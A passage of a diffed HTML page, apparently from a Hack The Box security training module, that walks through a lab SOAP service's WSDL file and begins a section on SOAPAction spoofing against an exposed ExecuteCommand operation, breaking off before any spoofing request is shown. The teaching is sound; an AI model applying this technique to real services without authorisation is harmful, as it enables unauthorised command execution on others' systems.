+        <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:part</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"parameters"</span> <span class="hljs-attr">element</span>=<span class="hljs-string">"tns:ExecuteCommandResponse"</span>/&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:message</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:portType</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"HacktheBoxSoapPort"</span>&gt;</span>
+        <span class="hljs-comment">&lt;!-- Login Operaion | PORT --&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:operation</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Login"</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:input</span> <span class="hljs-attr">message</span>=<span class="hljs-string">"tns:LoginSoapIn"</span>/&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:output</span> <span class="hljs-attr">message</span>=<span class="hljs-string">"tns:LoginSoapOut"</span>/&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:operation</span>&gt;</span>
+        <span class="hljs-comment">&lt;!-- ExecuteCommand Operation | PORT --&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:operation</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"ExecuteCommand"</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:input</span> <span class="hljs-attr">message</span>=<span class="hljs-string">"tns:ExecuteCommandSoapIn"</span>/&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:output</span> <span class="hljs-attr">message</span>=<span class="hljs-string">"tns:ExecuteCommandSoapOut"</span>/&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:operation</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:portType</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:binding</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"HacktheboxServiceSoapBinding"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"tns:HacktheBoxSoapPort"</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">soap:binding</span> <span class="hljs-attr">transport</span>=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/http"</span>/&gt;</span>
+        <span class="hljs-comment">&lt;!-- SOAP Login Action --&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:operation</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Login"</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">soap:operation</span> <span class="hljs-attr">soapAction</span>=<span class="hljs-string">"Login"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"document"</span>/&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:input</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">soap:body</span> <span class="hljs-attr">use</span>=<span class="hljs-string">"literal"</span>/&gt;</span>
+            <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:input</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:output</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">soap:body</span> <span class="hljs-attr">use</span>=<span class="hljs-string">"literal"</span>/&gt;</span>
+            <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:output</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:operation</span>&gt;</span>
+        <span class="hljs-comment">&lt;!-- SOAP ExecuteCommand Action --&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:operation</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"ExecuteCommand"</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">soap:operation</span> <span class="hljs-attr">soapAction</span>=<span class="hljs-string">"ExecuteCommand"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"document"</span>/&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:input</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">soap:body</span> <span class="hljs-attr">use</span>=<span class="hljs-string">"literal"</span>/&gt;</span>
+            <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:input</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:output</span>&gt;</span>
+                <span class="hljs-tag">&lt;<span class="hljs-name">soap:body</span> <span class="hljs-attr">use</span>=<span class="hljs-string">"literal"</span>/&gt;</span>
+            <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:output</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:operation</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:binding</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:service</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"HacktheboxService"</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:port</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"HacktheboxServiceSoapPort"</span> <span class="hljs-attr">binding</span>=<span class="hljs-string">"tns:HacktheboxServiceSoapBinding"</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">soap:address</span> <span class="hljs-attr">location</span>=<span class="hljs-string">"http://localhost:80/wsdl"</span>/&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:port</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:service</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:definitions</span>&gt;</span>
+</code></pre>
+<p>We identified the SOAP service's WSDL file!</p>
+<p><strong>Note</strong>: WSDL files can be found in many forms, such as <code>/example.wsdl</code>, <code>?wsdl</code>, <code>/example.disco</code>, <code>?disco</code> etc. <a href="https://docs.microsoft.com/en-us/archive/msdn-magazine/2002/february/xml-files-publishing-and-discovering-web-services-with-disco-and-uddi">DISCO</a> is a Microsoft technology for publishing and discovering Web Services.</p>
+<h3 id="wsdl-file-breakdown">WSDL File Breakdown</h3>
+<hr>
+<p>Let us now go over the identified WSDL file above together.</p>
+<p>The above WSDL file follows the <a href="https://www.w3.org/TR/2001/NOTE-wsdl-20010315">WSDL version 1.1</a> layout and consists of the following elements.</p>
+<ul>
+<li><p><code>Definition</code></p>
+<ul>
+<li>The root element of all WSDL files. Inside the definition, the name of the web service is specified, all namespaces used across the WSDL document are declared, and all other service elements are defined.</li>
+</ul>
+<pre><code class="lang-xml">&lt;wsd<span class="hljs-variable">l:definitions</span> targetNamespace=<span class="hljs-string">"http://tempuri.org/"</span> 
+
+    &lt;wsd<span class="hljs-variable">l:types</span>&gt;&lt;/wsd<span class="hljs-variable">l:types</span>&gt;
+    &lt;wsd<span class="hljs-variable">l:message</span> name=<span class="hljs-string">"LoginSoapIn"</span>&gt;&lt;/wsd<span class="hljs-variable">l:message</span>&gt;
+    &lt;wsd<span class="hljs-variable">l:portType</span> name=<span class="hljs-string">"HacktheBoxSoapPort"</span>&gt;
+        &lt;wsd<span class="hljs-variable">l:operation</span> name=<span class="hljs-string">"Login"</span>&gt;&lt;/wsd<span class="hljs-variable">l:operation</span>&gt;
+    &lt;/wsd<span class="hljs-variable">l:portType</span>&gt;
+    &lt;wsd<span class="hljs-variable">l:binding</span> name=<span class="hljs-string">"HacktheboxServiceSoapBinding"</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">"tns:HacktheBoxSoapPort"</span>&gt;
+        &lt;wsd<span class="hljs-variable">l:operation</span> name=<span class="hljs-string">"Login"</span>&gt;
+            &lt;soap:operation soapAction=<span class="hljs-string">"Login"</span> style=<span class="hljs-string">"document"</span>/&gt;
+            &lt;wsd<span class="hljs-variable">l:input</span>&gt;&lt;/wsd<span class="hljs-variable">l:input</span>&gt;
+            &lt;wsd<span class="hljs-variable">l:output</span>&gt;&lt;/wsd<span class="hljs-variable">l:output</span>&gt;
+        &lt;/wsd<span class="hljs-variable">l:operation</span>&gt;
+    &lt;/wsd<span class="hljs-variable">l:binding</span>&gt;
+    &lt;wsd<span class="hljs-variable">l:service</span> name=<span class="hljs-string">"HacktheboxService"</span>&gt;&lt;/wsd<span class="hljs-variable">l:service</span>&gt;
+&lt;/wsd<span class="hljs-variable">l:definitions</span>&gt;
+</code></pre>
+</li>
+<li><p><code>Data Types</code></p>
+<ul>
+<li>The data types to be used in the exchanged messages.</li>
+</ul>
+<pre><code class="lang-xml">&lt;wsd<span class="hljs-variable">l:types</span>&gt;
+    &lt;<span class="hljs-variable">s:schema</span> elementFormDefault=<span class="hljs-string">"qualified"</span> targetNamespace=<span class="hljs-string">"http://tempuri.org/"</span>&gt;
+        &lt;<span class="hljs-variable">s:element</span> name=<span class="hljs-string">"LoginRequest"</span>&gt;
+            &lt;<span class="hljs-variable">s:complexType</span>&gt;
+                &lt;<span class="hljs-variable">s:sequence</span>&gt;
+                    &lt;<span class="hljs-variable">s:element</span> minOccurs=<span class="hljs-string">"1"</span> maxOccurs=<span class="hljs-string">"1"</span> name=<span class="hljs-string">"username"</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">"s:string"</span>/&gt;
+                    &lt;<span class="hljs-variable">s:element</span> minOccurs=<span class="hljs-string">"1"</span> maxOccurs=<span class="hljs-string">"1"</span> name=<span class="hljs-string">"password"</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">"s:string"</span>/&gt;
+                &lt;/<span class="hljs-variable">s:sequence</span>&gt;
+            &lt;/<span class="hljs-variable">s:complexType</span>&gt;
+        &lt;/<span class="hljs-variable">s:element</span>&gt;
+        &lt;<span class="hljs-variable">s:element</span> name=<span class="hljs-string">"LoginResponse"</span>&gt;
+            &lt;<span class="hljs-variable">s:complexType</span>&gt;
+                &lt;<span class="hljs-variable">s:sequence</span>&gt;
+                    &lt;<span class="hljs-variable">s:element</span> minOccurs=<span class="hljs-string">"1"</span> maxOccurs=<span class="hljs-string">"unbounded"</span> name=<span class="hljs-string">"result"</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">"s:string"</span>/&gt;
+                &lt;/<span class="hljs-variable">s:sequence</span>&gt;
+            &lt;/<span class="hljs-variable">s:complexType</span>&gt;
+        &lt;/<span class="hljs-variable">s:element</span>&gt;
+        &lt;<span class="hljs-variable">s:element</span> name=<span class="hljs-string">"ExecuteCommandRequest"</span>&gt;
+            &lt;<span class="hljs-variable">s:complexType</span>&gt;
+                &lt;<span class="hljs-variable">s:sequence</span>&gt;
+                    &lt;<span class="hljs-variable">s:element</span> minOccurs=<span class="hljs-string">"1"</span> maxOccurs=<span class="hljs-string">"1"</span> name=<span class="hljs-string">"cmd"</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">"s:string"</span>/&gt;
+                &lt;/<span class="hljs-variable">s:sequence</span>&gt;
+            &lt;/<span class="hljs-variable">s:complexType</span>&gt;
+        &lt;/<span class="hljs-variable">s:element</span>&gt;
+        &lt;<span class="hljs-variable">s:element</span> name=<span class="hljs-string">"ExecuteCommandResponse"</span>&gt;
+            &lt;<span class="hljs-variable">s:complexType</span>&gt;
+                &lt;<span class="hljs-variable">s:sequence</span>&gt;
+                    &lt;<span class="hljs-variable">s:element</span> minOccurs=<span class="hljs-string">"1"</span> maxOccurs=<span class="hljs-string">"unbounded"</span> name=<span class="hljs-string">"result"</span> <span class="hljs-built_in">type</span>=<span class="hljs-string">"s:string"</span>/&gt;
+                &lt;/<span class="hljs-variable">s:sequence</span>&gt;
+            &lt;/<span class="hljs-variable">s:complexType</span>&gt;
+        &lt;/<span class="hljs-variable">s:element</span>&gt;
+    &lt;/<span class="hljs-variable">s:schema</span>&gt;
+&lt;/wsd<span class="hljs-variable">l:types</span>&gt;
+</code></pre>
+</li>
+<li><p><code>Messages</code></p>
+<ul>
+<li>Defines input and output operations that the web service supports. In other words, through the <em>messages</em> element, the messages to be exchanged, are defined and presented either as an entire document or as arguments to be mapped to a method invocation.</li>
+</ul>
+<pre><code class="lang-xml"><span class="hljs-comment">&lt;!-- Login Messages --&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">wsdl:message</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"LoginSoapIn"</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:part</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"parameters"</span> <span class="hljs-attr">element</span>=<span class="hljs-string">"tns:LoginRequest"</span>/&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:message</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">wsdl:message</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"LoginSoapOut"</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:part</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"parameters"</span> <span class="hljs-attr">element</span>=<span class="hljs-string">"tns:LoginResponse"</span>/&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:message</span>&gt;</span>
+<span class="hljs-comment">&lt;!-- ExecuteCommand Messages --&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">wsdl:message</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"ExecuteCommandSoapIn"</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:part</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"parameters"</span> <span class="hljs-attr">element</span>=<span class="hljs-string">"tns:ExecuteCommandRequest"</span>/&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:message</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">wsdl:message</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"ExecuteCommandSoapOut"</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:part</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"parameters"</span> <span class="hljs-attr">element</span>=<span class="hljs-string">"tns:ExecuteCommandResponse"</span>/&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:message</span>&gt;</span>
+  ```
+</code></pre>
+</li>
+<li><code>Operation</code><ul>
+<li>Defines the available SOAP actions alongside the encoding of each message.</li>
+</ul>
+</li>
+<li><p><code>Port Type</code></p>
+<ul>
+<li>Encapsulates every possible input and output message into an operation. More specifically, it defines the web service, the available operations and the exchanged messages. Please note that in WSDL version 2.0, the <em>interface</em> element is tasked with defining the available operations and when it comes to messages the (data) types element handles defining them.</li>
+</ul>
+<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">wsdl:portType</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"HacktheBoxSoapPort"</span>&gt;</span>
+    <span class="hljs-comment">&lt;!-- Login Operaion | PORT --&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:operation</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Login"</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:input</span> <span class="hljs-attr">message</span>=<span class="hljs-string">"tns:LoginSoapIn"</span>/&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:output</span> <span class="hljs-attr">message</span>=<span class="hljs-string">"tns:LoginSoapOut"</span>/&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:operation</span>&gt;</span>
+    <span class="hljs-comment">&lt;!-- ExecuteCommand Operation | PORT --&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:operation</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"ExecuteCommand"</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:input</span> <span class="hljs-attr">message</span>=<span class="hljs-string">"tns:ExecuteCommandSoapIn"</span>/&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:output</span> <span class="hljs-attr">message</span>=<span class="hljs-string">"tns:ExecuteCommandSoapOut"</span>/&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:operation</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:portType</span>&gt;</span>
+</code></pre>
+</li>
+<li><p><code>Binding</code></p>
+<ul>
+<li>Binds the operation to a particular port type. Think of bindings as interfaces. A client will call the relevant port type and, using the details provided by the binding, will be able to access the operations bound to this port type. In other words, bindings provide web service access details, such as the message format, operations, messages, and interfaces (in the case of WSDL version 2.0).</li>
+</ul>
+<pre><code class="lang-xml"><span class="hljs-tag">&lt;<span class="hljs-name">wsdl:binding</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"HacktheboxServiceSoapBinding"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"tns:HacktheBoxSoapPort"</span>&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">soap:binding</span> <span class="hljs-attr">transport</span>=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/http"</span>/&gt;</span>
+    <span class="hljs-comment">&lt;!-- SOAP Login Action --&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:operation</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Login"</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">soap:operation</span> <span class="hljs-attr">soapAction</span>=<span class="hljs-string">"Login"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"document"</span>/&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:input</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">soap:body</span> <span class="hljs-attr">use</span>=<span class="hljs-string">"literal"</span>/&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:input</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:output</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">soap:body</span> <span class="hljs-attr">use</span>=<span class="hljs-string">"literal"</span>/&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:output</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:operation</span>&gt;</span>
+    <span class="hljs-comment">&lt;!-- SOAP ExecuteCommand Action --&gt;</span>
+    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:operation</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"ExecuteCommand"</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">soap:operation</span> <span class="hljs-attr">soapAction</span>=<span class="hljs-string">"ExecuteCommand"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"document"</span>/&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:input</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">soap:body</span> <span class="hljs-attr">use</span>=<span class="hljs-string">"literal"</span>/&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:input</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:output</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">soap:body</span> <span class="hljs-attr">use</span>=<span class="hljs-string">"literal"</span>/&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:output</span>&gt;</span>
+    <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:operation</span>&gt;</span>
+<span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:binding</span>&gt;</span>
+</code></pre>
+</li>
+<li><p><code>Service</code></p>
+<ul>
+<li>A client makes a call to the web service through the name of the service specified in the service tag. Through this element, the client identifies the location of the web service.</li>
+</ul>
+<pre><code class="lang-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:service</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"HacktheboxService"</span>&gt;</span>
+
+      <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:port</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"HacktheboxServiceSoapPort"</span> <span class="hljs-attr">binding</span>=<span class="hljs-string">"tns:HacktheboxServiceSoapBinding"</span>&gt;</span>
+        <span class="hljs-tag">&lt;<span class="hljs-name">soap:address</span> <span class="hljs-attr">location</span>=<span class="hljs-string">"http://localhost:80/wsdl"</span>/&gt;</span>
+      <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:port</span>&gt;</span>
+
+    <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:service</span>&gt;</span>
+</code></pre>
+</li>
+</ul>
+<p>In the <code>SOAP Action Spoofing</code> section, later on, we will see how we can leverage the identified WSDL file to interact with the web service.</p>
+<h2 id="soapaction-spoofing">SOAPAction Spoofing</h2>
+<hr>
+<p>SOAP messages towards a SOAP service should include both the operation and the related parameters. This operation resides in the first child element of the SOAP message's body. If HTTP is the transport of choice, it is allowed to use an additional HTTP header called SOAPAction, which contains the operation's name. The receiving web service can identify the operation within the SOAP body through this header without parsing any XML.</p>
+<p>If a web service considers only the SOAPAction attribute when determining the operation to execute, then it may be vulnerable to SOAPAction spoofing.</p>
+<p>Let us assess together a SOAP service that is vulnerable to SOAPAction spoofing.</p>
+<p>Proceed to the end of this section and click on <code>Click here to spawn the target system!</code> or the <code>Reset Target</code> icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target web service and follow along.</p>
+<p>Suppose we are assessing a SOAP web service, whose WSDL file resides in <code>http://&lt;TARGET IP&gt;:3002/wsdl?wsdl</code>.</p>
+<p>The service's WSDL file can be found below.</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ curl http://<span class="hljs-tag">&lt;<span class="hljs-name">TARGET</span> <span class="hljs-attr">IP</span>&gt;</span>:3002/wsdl?wsdl 
+
+<span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-tag">&lt;<span class="hljs-name">wsdl:definitions</span> <span class="hljs-attr">targetNamespace</span>=<span class="hljs-string">"http://tempuri.org/"</span> 
+  <span class="hljs-attr">xmlns:s</span>=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema"</span> 
+  <span class="hljs-attr">xmlns:soap12</span>=<span class="hljs-string">"http://schemas.xmlsoap.org/wsdl/soap12/"</span> 
+  <span class="hljs-attr">xmlns:http</span>=<span class="hljs-string">"http://schemas.xmlsoap.org/wsdl/http/"</span> 
+  <span class="hljs-attr">xmlns:mime</span>=<span class="hljs-string">"http://schemas.xmlsoap.org/wsdl/mime/"</span> 
+  <span class="hljs-attr">xmlns:tns</span>=<span class="hljs-string">"http://tempuri.org/"</span> 
+  <span class="hljs-attr">xmlns:soap</span>=<span class="hljs-string">"http://schemas.xmlsoap.org/wsdl/soap/"</span> 
+  <span class="hljs-attr">xmlns:tm</span>=<span class="hljs-string">"http://microsoft.com/wsdl/mime/textMatching/"</span> 
+  <span class="hljs-attr">xmlns:soapenc</span>=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/encoding/"</span> 
+  <span class="hljs-attr">xmlns:wsdl</span>=<span class="hljs-string">"http://schemas.xmlsoap.org/wsdl/"</span>&gt;</span>
+
+  <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:types</span>&gt;</span>
+
+
+    <span class="hljs-tag">&lt;<span class="hljs-name">s:schema</span> <span class="hljs-attr">elementFormDefault</span>=<span class="hljs-string">"qualified"</span> <span class="hljs-attr">targetNamespace</span>=<span class="hljs-string">"http://tempuri.org/"</span>&gt;</span>
+
+
+
+      <span class="hljs-tag">&lt;<span class="hljs-name">s:element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"LoginRequest"</span>&gt;</span>
+
+        <span class="hljs-tag">&lt;<span class="hljs-name">s:complexType</span>&gt;</span>
+          <span class="hljs-tag">&lt;<span class="hljs-name">s:sequence</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">s:element</span> <span class="hljs-attr">minOccurs</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">maxOccurs</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"username"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"s:string"</span>/&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">s:element</span> <span class="hljs-attr">minOccurs</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">maxOccurs</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"password"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"s:string"</span>/&gt;</span>
+          <span class="hljs-tag">&lt;/<span class="hljs-name">s:sequence</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">s:complexType</span>&gt;</span>
+
+      <span class="hljs-tag">&lt;/<span class="hljs-name">s:element</span>&gt;</span>
+
+
+      <span class="hljs-tag">&lt;<span class="hljs-name">s:element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"LoginResponse"</span>&gt;</span>
+
+        <span class="hljs-tag">&lt;<span class="hljs-name">s:complexType</span>&gt;</span>
+          <span class="hljs-tag">&lt;<span class="hljs-name">s:sequence</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">s:element</span> <span class="hljs-attr">minOccurs</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">maxOccurs</span>=<span class="hljs-string">"unbounded"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"result"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"s:string"</span>/&gt;</span>
+          <span class="hljs-tag">&lt;/<span class="hljs-name">s:sequence</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">s:complexType</span>&gt;</span>
+      <span class="hljs-tag">&lt;/<span class="hljs-name">s:element</span>&gt;</span>
+
+
+      <span class="hljs-tag">&lt;<span class="hljs-name">s:element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"ExecuteCommandRequest"</span>&gt;</span>
+
+        <span class="hljs-tag">&lt;<span class="hljs-name">s:complexType</span>&gt;</span>
+          <span class="hljs-tag">&lt;<span class="hljs-name">s:sequence</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">s:element</span> <span class="hljs-attr">minOccurs</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">maxOccurs</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"cmd"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"s:string"</span>/&gt;</span>
+          <span class="hljs-tag">&lt;/<span class="hljs-name">s:sequence</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">s:complexType</span>&gt;</span>
+
+      <span class="hljs-tag">&lt;/<span class="hljs-name">s:element</span>&gt;</span>
+
+      <span class="hljs-tag">&lt;<span class="hljs-name">s:element</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"ExecuteCommandResponse"</span>&gt;</span>
+
+        <span class="hljs-tag">&lt;<span class="hljs-name">s:complexType</span>&gt;</span>
+          <span class="hljs-tag">&lt;<span class="hljs-name">s:sequence</span>&gt;</span>
+            <span class="hljs-tag">&lt;<span class="hljs-name">s:element</span> <span class="hljs-attr">minOccurs</span>=<span class="hljs-string">"1"</span> <span class="hljs-attr">maxOccurs</span>=<span class="hljs-string">"unbounded"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"result"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"s:string"</span>/&gt;</span>
+          <span class="hljs-tag">&lt;/<span class="hljs-name">s:sequence</span>&gt;</span>
+        <span class="hljs-tag">&lt;/<span class="hljs-name">s:complexType</span>&gt;</span>
+
+      <span class="hljs-tag">&lt;/<span class="hljs-name">s:element</span>&gt;</span>
+
+
+
+    <span class="hljs-tag">&lt;/<span class="hljs-name">s:schema</span>&gt;</span>
+
+
+  <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:types</span>&gt;</span>
+
+
+
+
+  <span class="hljs-comment">&lt;!-- Login Messages --&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:message</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"LoginSoapIn"</span>&gt;</span>
+
+    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:part</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"parameters"</span> <span class="hljs-attr">element</span>=<span class="hljs-string">"tns:LoginRequest"</span>/&gt;</span>
+
+  <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:message</span>&gt;</span>
+
+
+  <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:message</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"LoginSoapOut"</span>&gt;</span>
+
+    <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:part</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"parameters"</span> <span class="hljs-attr">element</span>=<span class="hljs-string">"tns:LoginResponse"</span>/&gt;</span>
+
+  <span class="hljs-tag">&lt;/<span class="hljs-name">wsdl:message</span>&gt;</span>
+
+
+  <span class="hljs-comment">&lt;!-- ExecuteCommand Messages --&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">wsdl:message</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"ExecuteCommandSoapIn"</span>&gt;</span>
+
